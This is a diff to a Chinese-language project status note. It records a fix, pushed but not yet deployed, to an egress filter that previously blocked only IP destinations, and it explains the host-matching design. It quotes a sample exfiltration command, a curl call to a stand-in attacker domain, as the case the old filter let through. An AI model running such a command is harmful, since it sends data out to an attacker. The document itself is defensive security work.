@@ -127,8 +127,14 @@
   `pii_patterns.ip_address`=disabled、`schema_migrations` 有 851、
   `session_summaries` 60 列，两台机共享这一份结果，端到端 8/8 通过。
   DB 侧**不存在**「各跑各的迁移」这回事，改一处两边同时生效。
-- **域名形式的外传目标从不被拦**（`curl http://evil.example.com/collect`
-  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。先于本次改动存在，未处理。
+- ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
+  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**2026-10-11 已修，代码已推送但
+  未部署**（用户裁决「先只提交代码、不动生产」，见审计文档该节）。
+  修法与 IP 侧同一条底线：默认公网可达即阻断，只豁免明确不可路由的主机
+  （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
+  **关键设计**：域名只在 URL 主机位（`scheme://host`、`host:port`、`user@host`）
+  上识别，**不做裸点分词**——否则 `cat README.md`、`v1.2.3`、`package.json`
+  全会被判成公网目的地，要救只能往豁免表塞文件后缀，那就是本仓吃过亏的枚举式写法。
 
 ## 已完成（已推送）
 
